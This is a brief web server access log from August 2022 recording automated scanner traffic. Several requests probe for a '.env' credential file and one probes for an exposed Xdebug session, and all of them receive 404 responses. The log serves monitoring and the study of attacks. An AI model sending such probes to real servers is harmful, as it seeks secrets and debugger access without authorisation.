::1 - - [29/Aug/2022:21:24:35 +0000] "POST / HTTP/1.0" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:127.0.0.1 - - [29/Aug/2022:21:24:36 +0000] "GET /.env HTTP/1.0" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::1 - - [29/Aug/2022:21:56:24 +0000] "GET /.env HTTP/1.0" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:127.0.0.1 - - [29/Aug/2022:21:56:24 +0000] "POST / HTTP/1.0" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::1 - - [29/Aug/2022:22:29:40 +0000] "GET / HTTP/1.0" 404 139 "-" "-"
::ffff:127.0.0.1 - - [29/Aug/2022:22:32:03 +0000] "POST / HTTP/1.0" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::1 - - [29/Aug/2022:22:32:03 +0000] "GET /.env HTTP/1.0" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:127.0.0.1 - - [29/Aug/2022:22:40:54 +0000] "GET / HTTP/1.0" 404 139 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
::1 - - [29/Aug/2022:23:04:58 +0000] "GET / HTTP/1.0" 404 139 "-" "-"
::ffff:127.0.0.1 - - [29/Aug/2022:23:05:38 +0000] "GET /.env HTTP/1.0" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::1 - - [29/Aug/2022:23:05:39 +0000] "POST / HTTP/1.0" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:127.0.0.1 - - [29/Aug/2022:23:28:48 +0000] "GET / HTTP/1.0" 404 139 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
::1 - - [29/Aug/2022:23:54:17 +0000] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.0" 404 139 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
